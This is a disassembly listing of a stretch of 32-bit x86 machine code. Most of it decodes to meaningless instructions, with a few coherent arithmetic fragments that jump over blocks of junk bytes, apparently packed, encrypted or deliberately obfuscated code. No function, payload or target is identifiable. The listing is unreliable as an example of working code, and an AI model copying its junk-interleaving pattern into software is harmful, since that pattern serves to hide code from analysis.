  411506:	(bad)
  411509:	(bad)
  41150c:	xor    bl,BYTE PTR [edi+0x4e]
  41150f:	dec    ecx
  411510:	mov    bl,0x91
  411512:	fstp   TBYTE PTR [edi-0x1a8787a3]
  411518:	jle    0x411592
  41151a:	js     0x4114b4
  41151c:	mov    bl,BYTE PTR [eax]
  41151e:	popw   ds
  411520:	shl    BYTE PTR [ebp-0x6e],cl
  411523:	fistp  WORD PTR [ebx+0x2e]
  411526:	sub    bh,al
  411528:	aam    0x69
  41152a:	clc    
  41152b:	clc    
  41152c:	daa    
  41152d:	xor    al,0x8c
  41152f:	(bad)  
  411530:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411531:	xor    BYTE PTR ds:0xfd9f28bc,ah
  411537:	cdq    
  411538:	wbinvd 
  41153a:	stos   DWORD PTR es:[edi],eax
  41153b:	jecxz  0x41155e
  41153d:	mov    bh,0x6d
  41153f:	retf   
  411540:	sbb    DWORD PTR [esi+edi*1],edi
  411543:	js     0x4115aa
  411545:	call   0xb7ad:0xac512186
  41154c:	sbb    ebp,DWORD PTR fs:[esi+ebx*8+0x40]
  411551:	lods   eax,DWORD PTR ds:[esi]
  411552:	outs   dx,BYTE PTR ds:[esi]
  411553:	mov    bl,0x10
  411555:	pop    esi
  411556:	push   esp
  411557:	add    eax,0x419b44a4
  41155c:	and    esp,DWORD PTR [edi+ecx*1-0x6e01b719]
  411563:	add    al,0x6b
  411565:	aam    0xe3
  411567:	fsubr  QWORD PTR [ebp+eax*2-0xf]
  41156b:	sub    esi,DWORD PTR ds:0x3859acea
  411571:	lea    esi,[edi-0x54]
  411574:	sub    al,dl
  411576:	mov    esp,0xfd9c4064
  41157b:	mov    edx,0xc02acf69
  411580:	lock fld QWORD PTR [esi-0x754fb9c5]
  411587:	fidiv  WORD PTR [edi+0xc]
  41158a:	ret    0xda91
  41158d:	je     0x41154a
  41158f:	ins    BYTE PTR es:[edi],dx
  411590:	xor    ch,bh
  411592:	stos   DWORD PTR es:[edi],eax
  411593:	add    esp,DWORD PTR ds:0x9e6e063
  411599:	imul   eax,ebp,0xd455407b
  41159f:	mov    bl,0xc
  4115a1:	dec    ebx
  4115a2:	js     0x41152f
  4115a4:	inc    esi
  4115a5:	ss pop edi
  4115a7:	iret   
  4115a8:	xchg   BYTE PTR [ebx-0x79],dh
  4115ab:	dec    ebp
  4115ac:	outs   dx,DWORD PTR ds:[esi]
  4115ad:	fld    TBYTE PTR [edi]
  4115af:	xchg   edx,eax
  4115b0:	mov    bl,0xc7
  4115b2:	xor    eax,DWORD PTR [eax-0x20f96d8b]
  4115b8:	dec    edi
  4115b9:	je     0x4115b3
  4115bb:	out    dx,al
  4115bc:	data16 aad 0x5e
  4115bf:	xor    DWORD PTR [edx+0x7e22e7e2],edi
  4115c5:	repz mov edx,0x8db7e900
  4115cb:	loope  0x411579
  4115cd:	icebp  
  4115ce:	in     al,0x71
  4115d0:	mov    al,0x75
  4115d2:	inc    ebx
  4115d3:	ins    DWORD PTR es:[edi],dx
  4115d4:	mov    BYTE PTR [ecx],ch
  4115d6:	sub    eax,0x30375921
  4115db:	sub    al,0xa
  4115dd:	pop    ds
  4115de:	rcr    DWORD PTR [edx],0x5a
  4115e1:	rol    bl,cl
  4115e3:	repnz adc ebx,DWORD PTR [edi+eiz*8]
  4115e7:	mov    al,0x6a
  4115e9:	int    0x71
  4115eb:	dec    edx
  4115ec:	popa   
  4115ed:	mov    dx,0x759a
  4115f1:	or     al,0x90
  4115f3:	out    dx,eax
  4115f4:	loop   0x411623
  4115f6:	cmp    bh,BYTE PTR [eax]
  4115f8:	mov    edx,0xe541219e
  4115fd:	mov    ds:0xe4d4608e,al
  411602:	sub    dh,BYTE PTR [eax+0x672999d4]
  411608:	cmp    dh,ah
  41160a:	add    eax,0x8752414
  41160f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411610:	or     al,0xe5
  411612:	adc    al,0x86
  411614:	dec    edx
  411615:	push   ebx
  411616:	pop    ebx
  411617:	aam    0x38
  411619:	pop    esp
  41161a:	adc    al,0x19
  41161c:	inc    ebx
  41161d:	xchg   edi,eax
  41161e:	or     bl,BYTE PTR [ebp-0x6515e96]
  411624:	mov    eax,0x5fb29291
  411629:	or     cl,0xfc
  41162c:	cmovg  ebx,DWORD PTR [ecx-0x25]
  411630:	push   ds
  411631:	aas    
  411632:	aad    0xce
  411634:	jns    0x4116a4
  411636:	lahf   
  411637:	adc    al,0x5
  411639:	outs   dx,BYTE PTR ds:[esi]
  41163a:	xor    eax,ecx
  41163c:	out    0x40,al
  41163e:	outs   dx,DWORD PTR ds:[esi]
  41163f:	adc    ebx,DWORD PTR [ebx-0x11079f51]
  411645:	and    dl,BYTE PTR [ebx-0xec77e47]
  41164b:	mov    al,0xf8
  41164d:	inc    edi
  41164e:	jg     0x4116c7
  411650:	rcr    bh,cl
  411652:	adc    al,0xb
  411654:	outs   dx,BYTE PTR ds:[esi]
  411655:	adc    bl,dl
  411657:	mov    ds:0xc03fc13e,al
  41165c:	fist   WORD PTR [ecx+0x2ccb833b]
  411662:	and    esp,edx
  411664:	push   ebp
  411665:	xchg   edi,eax
  411666:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411667:	(bad)
  41166a:	cli    
  41166b:	mov    BYTE PTR [ecx],bh
  41166d:	add    edx,esi
  41166f:	fdiv   DWORD PTR [edx]
  411671:	ror    BYTE PTR [edx+0x2dbf1a69],cl
  411677:	xchg   ebx,eax
  411678:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411679:	(bad)  
  41167a:	sub    eax,0xdb8b1df9
  41167f:	sbb    ecx,DWORD PTR [edi]
  411681:	push   0xffffffb7
  411683:	jmp    0x411691
  411685:	adc    BYTE PTR [bx+si+0x7e3b],0x30
  41168b:	fisubr WORD PTR [eax-0x13]
  41168e:	mov    ebp,0xfea7c2df
  411693:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411694:	fadd   QWORD PTR [edi-0x6bc3c674]
  41169a:	fdivp  st(5),st
  41169c:	jle    0x4116a5
  41169e:	addr16 mov bl,0x9f
  4116a1:	xor    eax,0xe8a6db48
  4116a6:	idiv   dl
  4116a8:	sbb    DWORD PTR [ecx+0x67],esp
  4116ab:	fwait
  4116ac:	mov    ebx,DWORD PTR ds:0x765da355
  4116b2:	jne    0x4116ee
  4116b4:	lds    ecx,FWORD PTR [ebp+0x3c]
  4116b7:	cmp    al,0x86
  4116b9:	inc    ebx
  4116ba:	jmp    0x2b44e627
  4116bf:	push   esp
  4116c0:	sbb    edx,DWORD PTR [edx+0x6cc4e6b]
  4116c6:	cs ror ah,cl
  4116c9:	dec    eax
  4116ca:	mov    cl,0x9e
  4116cc:	or     al,0x14
  4116ce:	pop    esi
  4116cf:	fidiv  WORD PTR [esi-0x49]
  4116d2:	test   DWORD PTR [ebp+0x3],ebp
  4116d5:	or     al,BYTE PTR [ebp-0x5e]
  4116d8:	out    0x0,al
  4116da:	not    DWORD PTR [edx]
  4116dc:	mov    bh,0x99
  4116de:	ret    
  4116df:	test   eax,0xf65eac36
  4116e4:	scas   eax,DWORD PTR es:[edi]
  4116e5:	lahf   
  4116e6:	arpl   WORD PTR [esi],ax
  4116e8:	cmp    al,0x9a
  4116ea:	push   edi
  4116eb:	in     eax,dx
  4116ec:	sub    DWORD PTR [ecx],ebx
  4116ee:	mov    WORD PTR [eax-0x4bb96ca],fs
  4116f4:	fld    QWORD PTR [ecx-0x498cf400]
  4116fa:	dec    edi
  4116fb:	push   ss
  4116fc:	je     0x41169c
  4116fe:	xor    eax,eax
  411700:	je     0x4116fe
  411702:	pop    edx
  411703:	adc    eax,0x80f0f205
  411708:	dec    ecx
  411709:	nop
  41170a:	push   ss
  41170b:	pop    es
  41170c:	push   cs
  41170d:	jge    0x41170c
  41170f:	test   bl,bh
  411711:	mov    esp,0xdc9caa67
  411716:	rcl    DWORD PTR [edi+0x11],0xf2
  41171a:	pop    ecx
  41171b:	aam    0xe
  41171d:	add    BYTE PTR [esi],al
  41171f:	cmp    al,0xd5
  411721:	xchg   ebp,eax
  411722:	and    DWORD PTR [edx-0x357518c9],esp
  411728:	idiv   BYTE PTR [edi-0x35bdae18]
  41172e:	pop    ecx
  41172f:	or     DWORD PTR [esi],edi
  411731:	pushf  
  411732:	xor    edi,DWORD PTR [ebx-0x26]
  411735:	mov    esp,0xd2c2941
  41173a:	je     0x4116bc
  41173c:	loopne 0x41173c
  41173e:	ins    DWORD PTR es:[edi],dx
  41173f:	outs   dx,BYTE PTR ds:[esi]
  411740:	or     BYTE PTR [ebx-0x74],0x49
  411744:	out    0x1d,al
  411746:	and    al,0xc
  411748:	fisub  WORD PTR [esi]
  41174a:	push   0x32191720
  41174f:	int3   
  411750:	mov    cl,bl
  411752:	cmp    eax,0x9c076f5b
  411757:	or     dh,ch
  411759:	xchg   BYTE PTR [edx+0x2aac846f],bh
  41175f:	outs   dx,BYTE PTR ds:[esi]
  411760:	xlat   BYTE PTR ds:[ebx]
  411761:	rcl    DWORD PTR [eax-0xe],cl
  411764:	jb     0x4117cb
  411766:	sub    DWORD PTR [esi],0x53
  411769:	push   ebp
  41176a:	mov    edx,0x6cf7ee0e
  41176f:	pushf  
  411770:	test   eax,0x9661af3e
  411775:	mov    cl,0x1
  411777:	enter  0xceee,0x5e
  41177b:	daa    
  41177c:	stc    
  41177d:	jmp    0x766c0129
  411782:	sub    eax,0x8b3fa2a6
  411787:	push   ebp
  411788:	shr    cl,1
  41178a:	call   0x8b411796
  41178f:	push   ebp
  411790:	enter  0x7d8b,0xfc
  411794:	xor    edx,eax
  411796:	xor    edi,eax
  411798:	add    edi,ecx
  41179a:	add    edx,ecx
  41179c:	imul   edx,edi
  41179f:	mov    edi,DWORD PTR [ebp-0x8]
  4117a2:	jmp    0x411a2a
  4117a7:	iret   
  4117a8:	leave  
  4117a9:	into   
  4117aa:	xlat   BYTE PTR ds:[ebx]
  4117ab:	fcmovu st,st(3)
  4117ad:	aad    0xc9
  4117af:	cli    
  4117b0:	je     0x411765
  4117b2:	sti    
  4117b3:	in     eax,dx
  4117b4:	push   0x6224ae48
  4117b9:	js     0x411833
  4117bb:	in     eax,0x7e
  4117bd:	js     0x411837
  4117bf:	call   0xe4ca89d
  4117c4:	je     0x41181e
  4117c6:	mov    BYTE PTR [edx+0x4ae7b162],dl
  4117cc:	pop    esp
  4117cd:	mov    cl,0x5a
  4117cf:	int3   
  4117d0:	jbe    0x4117bc
  4117d2:	out    dx,al
  4117d3:	das    
  4117d4:	aam    0xa1
  4117d6:	mov    dh,BYTE PTR [eax-0x58c16796]
  4117dc:	stc    
  4117dd:	(bad)  
  4117de:	mov    ebp,0x648e5469
  4117e3:	mov    cl,0x15
  4117e5:	cli    
  4117e6:	add    BYTE PTR [ebp+0x21],dh
  4117e9:	jge    0x411805
  4117eb:	jle    0x411792
  4117ed:	mov    cl,BYTE PTR ds:0xe073fed6
  4117f3:	loopne 0x4117c1
  4117f5:	lds    ecx,FWORD PTR [edx-0x630049a0]
  4117fb:	lea    ecx,[ecx+0x2d]
  4117fe:	ret    
  4117ff:	xlat   BYTE PTR ds:[ebx]
  411800:	mov    ebp,0x1973fca8
  411805:	jl     0x4117e8
  411807:	inc    esi
  411808:	psllq  mm3,QWORD PTR [eax-0x7d]
  41180c:	jl     0x411792
  41180e:	sub    ebp,DWORD PTR [ecx]
  411810:	out    dx,al
  411811:	test   eax,0x51f05958
  411816:	jno    0x4117b9
  411818:	loopne 0x411871
  41181a:	and    dh,BYTE PTR [edx+0x48d29b92]
  411820:	push   0x2d
  411822:	xchg   edi,esp
  411824:	lock int 0x7c
  411827:	mov    ebx,DWORD PTR [edx+esi*1]
  41182a:	aad    0x94
  41182c:	mov    eax,ds:0x3ff35e66
  411831:	adc    al,bl
  411833:	aaa    
  411834:	push   ebx
  411835:	jecxz  0x411895
  411837:	pusha  
  411838:	xchg   esi,eax
  411839:	sbb    eax,0xf5bb062
  41183e:	jmp    0x4117ef
  411840:	cli    
  411841:	and    DWORD PTR [edi+0x4b],ebp
  411844:	push   0x9a802558
  411849:	fisub  WORD PTR [ebx+ebp*2+0x59]
  41184d:	loope  0x4118bd
  41184f:	xchg   esi,eax
  411850:	cmp    BYTE PTR [edi+0xf],ah
  411853:	sar    DWORD PTR [ebx],1
  411855:	mov    ecx,0xcb2ffea8
  41185a:	cmc    
  41185b:	addr16 clc 
  41185d:	jbe    0x4117eb
  41185f:	jg     0x411847
  411861:	push   cs
  411862:	call   0xf8f78f48
  411867:	jp     0x4117ee
  411869:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41186a:	mov    ebp,0xfa4ed115
  41186f:	jmp    0x2a52:0x1fa520c3
  411876:	mov    ecx,0xf2dc149
  41187b:	(bad)  
  41187c:	adc    edi,DWORD PTR [ecx]
  41187e:	enter  0xeeda,0xe6
  411882:	xchg   edx,eax
  411883:	push   0x49
  411885:	mov    edx,0xb2004610
  41188a:	gs mov eax,0xe908e339
  411890:	es sbb al,0xa7
  411893:	push   ss
  411894:	fldl2e 
  411896:	add    BYTE PTR [esi+0x76],al
  411899:	cli    
  41189a:	pop    ebp
  41189b:	cdq    
  41189c:	mov    esp,0xe18c0797
  4118a1:	scas   eax,DWORD PTR es:[edi]
  4118a2:	dec    eax
  4118a3:	jns    0x41183e
  4118a5:	xor    BYTE PTR [ebp+esi*1-0x69],0x71
  4118aa:	or     DWORD PTR [ebx],0xbbd221c1
  4118b0:	lods   eax,DWORD PTR ds:[esi]
  4118b1:	sub    esi,0x35d03456
  4118b7:	addr16 aad 0x97
  4118ba:	mov    al,bl
  4118bc:	cs pop ds
  4118be:	outs   dx,BYTE PTR ds:[esi]
  4118bf:	mov    edi,0x70432d0
  4118c4:	pop    esi
  4118c5:	je     0x41184e
  4118c7:	pushf  
  4118c8:	repnz mov DWORD PTR ds:[ecx+0xf37cde1],edi
  4118d0:	sbb    BYTE PTR [eax+0x6a],dl
  4118d3:	(bad)  
  4118d4:	pop    ecx
  4118d5:	xor    BYTE PTR [ecx+0xcedb212],cl
  4118db:	in     al,dx
  4118dc:	jecxz  0x4118c7
  4118de:	push   0xffffff80
  4118e0:	retf   0x7eaf
  4118e3:	inc    edi
  4118e4:	push   ss
  4118e5:	daa    
  4118e6:	sti    
  4118e7:	cdq    
  4118e8:	test   DWORD PTR [edx],esi
  4118ea:	pop    edi
  4118eb:	cmp    ah,BYTE PTR [ecx]
  4118ed:	(bad)  
  4118ee:	mov    ebx,0xbcde4c79
  4118f3:	xchg   BYTE PTR [ebx],bl
  4118f5:	push   0x85c0b476
  4118fa:	fidivr DWORD PTR [edi-0x5dcadbbd]
  411900:	push   edi
  411901:	cli    
  411902:	add    al,0xc9
  411904:	into   
  411905:	fs out 0xb9,eax
  411908:	and    BYTE PTR [ebp+0x3cd440d0],ah
  41190e:	(bad)  
  41190f:	xor    DWORD PTR [esi+0x76],esp
  411912:	sub    dh,cl
  411914:	ror    DWORD PTR [ebx],1
  411916:	dec    edi
  411917:	inc    ecx
  411918:	jbe    0x411934
  41191a:	lods   al,BYTE PTR ds:[esi]
  41191b:	mov    dh,0x9d
  41191d:	ret    
  41191e:	clc    
  41191f:	call   0xbd1d:0x638ce38b
  411926:	sub    eax,0xc71ebcc3
  41192b:	(bad)  
  41192c:	mov    al,ds:0x5048330b
  411931:	js     0x4118da
  411933:	xor    ebp,DWORD PTR [edx+0x1e]
  411936:	cmp    ebp,DWORD PTR [ecx]
  411938:	adc    eax,0xc30ba0ba
  41193d:	jne    0x4118c8
  41193f:	out    0x9,eax
  411941:	fistp  WORD PTR [edi+0x480313c9]
  411947:	dec    esp
  411948:	sub    DWORD PTR [edx],ecx
  41194a:	cli    
  41194b:	add    ch,BYTE PTR [esi]
  41194d:	add    DWORD PTR ds:0x810ab730,edx
  411953:	xor    ebp,edx
  411955:	mov    eax,DWORD PTR [ebp-0x44]
  411958:	icebp  
  411959:	pop    edi
  41195a:	popa   
  41195b:	add    esi,edx
  41195d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41195e:	fistp  QWORD PTR [edi]
  411960:	in     eax,dx
  411961:	add    ebp,DWORD PTR [edx-0x5b359a63]
  411967:	cli    
  411968:	dec    edi
  411969:	enter  0xeab5,0x3f
  41196d:	cs push ss
  41196f:	sub    bl,cl
  411971:	cmp    ebx,DWORD PTR [ebx]
  411973:	pop    ss
  411974:	add    eax,0xe8314efc
  411979:	ret    0x7c18
  41197c:	jl     0x411937
  41197e:	sub    bh,al
  411980:	mov    cs,WORD PTR [ecx+eax*8]
  411983:	cmp    eax,0xd6d692bb
  411988:	sbb    eax,0x3474f91
  41198d:	addr16 fsubr st,st(3)
  411990:	out    0x4f,eax
  411992:	(bad)  
  411993:	sbb    DWORD PTR [eax],ecx
  411995:	xchg   edx,esp
  411997:	and    dh,dh
  411999:	mov    bh,0xfa
  41199b:	sub    eax,ebx
  41199d:	test   dh,cl
  41199f:	mov    BYTE PTR [esi+0x26a6c4eb],bh
  4119a5:	xchg   ecx,eax
  4119a6:	xor    eax,0xe87f12be
  4119ab:	or     eax,eax
  4119ad:	stos   BYTE PTR es:[edi],al
  4119ae:	jg     0x411946
  4119b0:	pop    edx
  4119b1:	cmp    bh,BYTE PTR [ebx]
  4119b3:	imul   esp,DWORD PTR [ebx-0x62],0xffffff8e
  4119b7:	fisub  DWORD PTR [ebx+ebx*1]
  4119ba:	xchg   esp,esp
  4119bc:	jbe    0x411a0f
  4119be:	sub    bh,BYTE PTR [esi]
  4119c0:	mov    ecx,0x9d3d15cf
  4119c5:	push   edi
  4119c6:	arpl   WORD PTR [ecx-0x2d],ax
  4119c9:	adc    al,0x31
  4119cc:	mov    cs,esi
  4119ce:	xchg   esi,eax
  4119cf:	ror    DWORD PTR [edi],0x23
  4119d2:	and    ch,al
  4119d4:	je     0x4119df
  4119d6:	push   0x284d7424
  4119db:	fwait
  4119dc:	scas   al,BYTE PTR es:[edi]
  4119dd:	mov    ebx,0xedb3b629
  4119e2:	mov    eax,ds:0x220e302c
  4119e7:	cmp    al,0x82
  4119e9:	sbb    ebx,DWORD PTR [eax+0x54]
  4119ec:	fist   WORD PTR [ebx+0x9]
  4119ef:	xor    DWORD PTR [ecx-0x7f],eax
  4119f2:	lods   al,BYTE PTR ds:[esi]
  4119f3:	adc    BYTE PTR [ebx],ch
  4119f5:	mul    BYTE PTR [eax-0x37ce00b1]
  4119fb:	sub    eax,0xc0d1495
  411a00:	retf   0xbf9e
  411a03:	lahf   
  411a04:	scas   eax,DWORD PTR es:[edi]
  411a05:	or     edx,DWORD PTR [ebp-0x25]
  411a08:	(bad)  
  411a09:	out    dx,al
  411a0a:	sbb    eax,DWORD PTR [edi+edi*1+0x460bfe32]
  411a11:	and    cl,BYTE PTR [edi]
  411a13:	and    cl,BYTE PTR [ecx]
  411a15:	push   cs
  411a16:	repnz rcl DWORD PTR [ebp+0x2c],0xb8
  411a1b:	xchg   edx,eax
  411a1c:	inc    eax
  411a1d:	mov    ecx,DWORD PTR [ebx]
  411a1f:	or     DWORD PTR [esi*2+0x78f96a4],eax
  411a26:	cmp    al,0x2d
  411a28:	mov    esp,0xf05d8bfc
  411a2d:	sub    ebx,edi
  411a2f:	cmp    ebx,edx
  411a31:	ja     0x411a3f
  411a37:	mov    edx,DWORD PTR [ebp-0x34]
  411a3a:	jmp    0x411f76
  411a3f:	mov    edx,DWORD PTR [ebp-0x3c]
  411a42:	mov    edi,DWORD PTR [ebp-0x4]
  411a45:	xor    edx,eax
  411a47:	xor    edi,eax
  411a49:	add    edx,ecx
  411a4b:	add    edi,ecx
  411a4d:	imul   edx,edi
  411a50:	jmp    0x411cd8
  411a55:	into   
  411a56:	(bad)  
  411a57:	cmp    al,0xc7
  411a59:	fxch   st(3)
  411a5b:	(bad)  
  411a5d:	sub    eax,0x4ed7da8b
  411a62:	loope  0x411abc
  411a64:	clc    
  411a65:	xchg   ecx,eax
  411a66:	pusha  
  411a67:	js     0x411ae1
  411a69:	in     eax,0x7e
  411a6b:	js     0x411ae5
  411a6d:	and    ebx,DWORD PTR [ecx+ebx*2+0x45]
  411a71:	mov    eax,0xbe0ae2ad
  411a76:	jmp    0x11fd:0x1231d9bf
  411a7d:	sub    eax,0xff0ae6ed
  411a82:	out    0xde,eax
  411a84:	aas    
  411a85:	push   ebx
  411a86:	ds jmp 0x3203:0x2abcc49e
  411a8e:	jle    0x411a9e
  411a90:	test   eax,0x54128618
  411a95:	jae    0x411a48
  411a97:	dec    edx
  411a98:	cmp    eax,0x8de4da9f
  411a9d:	out    0x26,eax
  411a9f:	out    dx,al
  411aa0:	retf   
  411aa1:	jp     0x411b1b
  411aa3:	cwde   
  411aa4:	dec    esi
  411aa5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411aa6:	outs   dx,BYTE PTR ds:[esi]
  411aa7:	ins    DWORD PTR es:[edi],dx
  411aa8:	fidivr DWORD PTR [esp+eax*1+0x4d891b97]
  411aaf:	cmp    BYTE PTR [ecx+ebp*1],ah
  411ab2:	shr    DWORD PTR ds:0x26fc10e8,1
  411ab8:	xor    bh,BYTE PTR [esi]
  411aba:	and    eax,0xd519385c
  411abf:	(bad)  
  411ac1:	xchg   ecx,eax
  411ac2:	xor    BYTE PTR [edx+0x29],bh
  411ac5:	dec    edx
  411ac6:	fisubr WORD PTR [esi-0x3a]
  411ac9:	jns    0x411ac2
  411acb:	xchg   esi,eax
  411acc:	test   DWORD PTR [esi],0xf8e9525b
  411ad2:	int    0xb1
  411ad4:	jmp    0x740129ec
  411ad9:	(bad)  
  411ada:	pop    edi
  411adb:	mov    edx,es
  411add:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411ade:	leave  
  411adf:	outs   dx,BYTE PTR ds:[esi]
  411ae0:	push   esp
  411ae1:	fisubr DWORD PTR [esi-0x66b0ded8]
  411ae7:	mov    ?,WORD PTR [eax-0x7f5b6cc7]
  411aed:	push   esp
  411aee:	push   esp
  411aef:	pop    ss
  411af0:	add    al,0x85
  411af2:	dec    ecx
  411af3:	mov    ebp,0xd1321e82
  411af8:	sbb    bl,BYTE PTR [ecx-0x1751c65c]
  411afe:	pusha  
  411aff:	in     eax,dx
  411b00:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411b01:	fnstenv [ecx]
  411b03:	fild   QWORD PTR [eax+ecx*8+0x2]
  411b07:	xor    eax,0x2418eed5
  411b0c:	dec    ebx
  411b0d:	adc    al,0x19
  411b0f:	repnz mov ah,0x18
  411b12:	xor    al,0x0
  411b14:	imul   esp,esi,0x1f93b2a9
  411b1a:	pop    ebx
  411b1b:	pop    ebp
  411b1c:	jmp    0x2b4a:0x62a16945
  411b23:	cmp    DWORD PTR [edi-0x5d8b3358],esi
  411b29:	xchg   DWORD PTR [esi-0x267aa245],ebp
  411b2f:	mov    bl,bh
  411b31:	xchg   edx,eax
  411b32:	repnz das 
  411b34:	inc    esp
  411b35:	and    al,0x31
  411b37:	in     al,0xd1
  411b39:	jb     0x411b5f
  411b3b:	add    ch,BYTE PTR [ebx+0x6c28ffe8]
  411b41:	mov    es,WORD PTR [edx]
  411b43:	inc    ebp
  411b44:	mov    ecx,0x7ee6dbdf
  411b49:	mov    al,0x46
  411b4b:	mov    eax,0x4b2df3b1
  411b50:	xchg   ecx,eax
  411b51:	in     eax,0x96
  411b53:	sbb    ebp,0x5f
  411b56:	sti    
  411b57:	test   ebp,edx
  411b59:	cli    
  411b5a:	push   edi
  411b5b:	addr16 dec edx
  411b5d:	sbb    eax,0xf40da6c
  411b62:	inc    eax
  411b63:	and    BYTE PTR [edx+edi*4-0x13cae201],ah
  411b6a:	cmp    DWORD PTR [ebx],edx
  411b6c:	jp     0x411b79
  411b6e:	xchg   esp,eax
  411b6f:	in     eax,0xc2
  411b71:	pop    ecx
  411b72:	inc    esi
  411b73:	mov    ch,0xcf
  411b75:	sbb    al,0xb
  411b77:	call   0x1827:0x81e976c6
  411b7e:	jp     0x411b3e
  411b80:	inc    ecx
  411b81:	inc    edx
  411b82:	jmp    FWORD PTR [ecx-0x4150bc2f]
  411b88:	gs jge 0x411ba8
  411b8b:	push   eax
  411b8c:	int    0x4
  411b8e:	push   es
  411b8f:	in     al,0xce
  411b91:	mov    eax,0x8c82eac9
  411b96:	cmp    DWORD PTR [edi+eax*8],ebx
  411b99:	xor    esp,DWORD PTR fs:[eax-0x5b]
  411b9d:	xchg   ebx,eax
  411b9e:	jle    0x411bd8
  411ba0:	or     al,0xfb
  411ba2:	cmp    BYTE PTR [esi+0x18],al
  411ba5:	jne    0x411b61
  411ba7:	adc    BYTE PTR [esi-0x39],dh
  411baa:	push   ecx
  411bab:	ror    BYTE PTR [edx+0x161b202b],cl
  411bb1:	sahf   
  411bb2:	std    
  411bb3:	test   DWORD PTR [esi-0x79],ebx
  411bb6:	sub    DWORD PTR [ebx-0x7],ebp
  411bb9:	jbe    0x411c37
  411bbb:	outs   dx,BYTE PTR ds:[esi]
  411bbc:	(bad)  
  411bbd:	adc    eax,0x1b074fd8
  411bc2:	mov    ch,0x30
  411bc4:	or     eax,0xfc8958b5
  411bc9:	mov    esi,0x7f2c842
  411bce:	fcom   DWORD PTR [esi+0xb]
  411bd1:	in     al,dx
  411bd2:	adc    eax,0x90359e8b
  411bd7:	arpl   di,di
  411bd9:	add    al,0xb5
  411bdb:	bound  edx,QWORD PTR [edi+0x3a8e96a6]
  411be1:	push   ebp
  411be2:	pop    ecx
  411be3:	cld    
  411be4:	mov    al,ds:0xbb388c26
  411be9:	test   eax,0x20bb9332
  411bee:	push   ebx
  411bef:	rcr    BYTE PTR ds:0x7f3520dc,cl
  411bf5:	jp     0x411c23
  411bf7:	mov    DWORD PTR [ebx-0x5b7e74b5],edi
  411bfd:	stos   BYTE PTR es:[edi],al
  411bfe:	test   bl,al
  411c00:	leave  
  411c01:	xchg   edx,eax
  411c02:	jle    0x411be8
  411c04:	neg    DWORD PTR [edx-0x60aad4f4]
  411c0a:	imul   edi,esi,0xffffffd7
  411c0d:	adc    bl,al
  411c0f:	in     eax,0xa1
  411c11:	add    bl,al
  411c13:	dec    esi
  411c14:	xor    esp,DWORD PTR cs:[edx-0x7a]
  411c18:	in     eax,0x14
  411c1a:	mov    BYTE PTR ss:[ebx+edx*1],bh
  411c1e:	mov    al,ds:0x7e8cc4df
  411c23:	jmp    0x199e:0x87dd15ac
  411c2a:	xor    DWORD PTR [edi+0x11],esi
  411c2d:	add    ebx,DWORD PTR [eax-0x291535b4]
  411c33:	xchg   BYTE PTR [ebx],cl
  411c35:	push   ss
  411c36:	and    edi,DWORD PTR [ebp+ebp*2-0x41]
  411c3a:	pop    edi
  411c3b:	cwde   
  411c3c:	dec    eax
  411c3d:	mov    esi,0x299f4360
  411c42:	xchg   esp,eax
  411c43:	dec    ebx
  411c44:	or     BYTE PTR [edi],al
  411c46:	or     ebx,DWORD PTR ds:[eax+0x37]
  411c4a:	mul    BYTE PTR [esi-0x24e07c42]
  411c50:	aam    0x8c
  411c52:	leave  
  411c53:	fsub   QWORD PTR [edi]
  411c55:	add    eax,0xfae899ad
  411c5a:	lock jns 0x411c5c
  411c5d:	and    cl,BYTE PTR [ecx]
  411c5f:	test   eax,0xc9174d5
  411c64:	test   al,0xde
  411c66:	mov    bl,0x89
  411c68:	sbb    al,0x6d
  411c6a:	int3   
  411c6b:	adc    DWORD PTR [eax],ecx
  411c6d:	pop    edx
  411c6e:	test   DWORD PTR [edi+0x77884633],ebp
  411c74:	sub    ch,0xca
  411c77:	stc    
  411c78:	mov    ah,BYTE PTR [ecx]
  411c7a:	xchg   ebp,eax
  411c7b:	fxch   st(6)
  411c7d:	mul    BYTE PTR [eax]
  411c7f:	lods   al,BYTE PTR ds:[esi]
  411c80:	mov    ebp,0x21f2116b
  411c85:	jnp    0x411c10
  411c87:	outs   dx,BYTE PTR ds:[esi]
  411c88:	mov    ah,0x1c
  411c8a:	sbb    ch,BYTE PTR [esi]
  411c8c:	mov    esp,0xb456fa01
  411c91:	mov    dh,0x44
  411c93:	test   al,0x8b
  411c95:	mov    ecx,0x6e13acb8
  411c9a:	icebp  
  411c9b:	int    0xd2
  411c9d:	jb     0x411cb0
  411c9f:	xchg   ebp,eax
  411ca0:	int    0xa4
  411ca2:	xchg   DWORD PTR [eax+eax*8-0x48],ebx
  411ca6:	js     0x411ce8
  411ca8:	jo     0x411ce9
  411caa:	in     eax,dx
  411cab:	loopne 0x411ca2
  411cad:	stos   DWORD PTR es:[edi],eax
  411cae:	add    DWORD PTR [eax],ebp
  411cb0:	and    esp,DWORD PTR [eax]
  411cb2:	into   
  411cb3:	adc    ebp,ebp
  411cb5:	lahf   
  411cb6:	daa    
  411cb7:	mov    esi,0x9d00ab39
  411cbc:	rcr    eax,1
  411cbe:	nop
  411cbf:	and    ebp,DWORD PTR [ebp-0x1abd09c5]
  411cc5:	pop    ecx
  411cc6:	lock ds or eax,0x61d853d9
  411ccd:	ficomp WORD PTR [esp+ebp*4-0x56]
  411cd1:	cmp    BYTE PTR [esi+edi*2-0x4b],dl
  411cd5:	aas    
  411cd6:	test   edx,0x8bf87d8b
  411cdc:	pop    ebp
  411cdd:	lock sub ebx,edi
  411ce0:	cmp    ebx,edx
  411ce2:	mov    edx,DWORD PTR [ebp-0x38]
  411ce5:	jbe    0x411f76
  411ceb:	jmp    0x411f73
  411cf0:	rol    al,1
  411cf2:	(bad)  
  411cf3:	ds (bad) 
  411cf5:	into   
  411cf6:	rcl    dh,1
  411cf8:	adc    eax,0xd966579e
  411cfd:	lods   eax,DWORD PTR ds:[esi]
  411cfe:	or     edx,esp
  411d00:	jle    0x411d67
